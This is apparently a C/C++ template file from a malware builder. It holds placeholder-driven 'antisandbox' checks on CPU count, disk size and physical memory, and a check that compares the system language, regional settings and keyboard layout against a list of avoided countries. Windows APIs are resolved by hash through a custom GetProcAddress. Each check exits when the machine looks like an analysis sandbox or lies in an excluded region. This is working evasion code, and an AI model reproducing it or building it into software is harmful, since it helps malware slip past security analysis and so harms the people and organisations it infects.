// Templates for antisandbox checks
// Placeholders: %__VALUE__%, AVOIDED_COUNTRIES, AVOIDED_COUNTRIES_SIZE

//__CPU Check__//
GetSystemInfoFunc pGetSystemInfo = (GetSystemInfoFunc)CustomGetProcAddress(hKernel32, GET_SYSTEM_INFO_HASH);
SYSTEM_INFO sysInfo;
pGetSystemInfo(&sysInfo);

if (sysInfo.dwNumberOfProcessors <= %__VALUE__%) {
    return false;
}
//__END__CPU Check__//

//__Disk Check__//
ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
if (!GetDiskFreeSpaceExA(NULL, &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
    return false;
}

if (totalBytes.QuadPart < %__VALUE__%) {
    return false;
}
//__END__Disk Check__//

//__Memory Check__//
MEMORYSTATUSEX memStatus;
memStatus.dwLength = sizeof(memStatus);
GlobalMemoryStatusEx(&memStatus);

if (memStatus.ullTotalPhys / (1024 * 1024) < %__VALUE__%) {
    return false;
}
//__END__Memory Check__//

//__Country Check__//
GetSystemDefaultLangIDFunc pGetSystemDefaultLangID = (GetSystemDefaultLangIDFunc)CustomGetProcAddress(hKernel32, GET_SYSTEM_DEFAULT_LANGID_HASH);
GetSystemDefaultLCIDFunc pGetSystemDefaultLCID = (GetSystemDefaultLCIDFunc)CustomGetProcAddress(hKernel32, GET_SYSTEM_DEFAULT_LCID_HASH);
GetKeyboardLayoutFunc pGetKeyboardLayout = (GetKeyboardLayoutFunc)CustomGetProcAddress(hUser32, GET_KEYBOARD_LAYOUT_HASH);

uint16_t id_keyboard = LOWORD(pGetKeyboardLayout(0));   // Keyboard layout
uint16_t id_system = pGetSystemDefaultLangID();         // System language
uint16_t id_regional = LOWORD(pGetSystemDefaultLCID()); // System regional settings
for (size_t i = 0; i < AVOIDED_COUNTRIES_SIZE; i++) {
    if (AVOIDED_COUNTRIES[i] == id_keyboard || AVOIDED_COUNTRIES[i] == id_system || AVOIDED_COUNTRIES[i] == id_regional) {
        return false;
    }
}
//__END__Country Check__//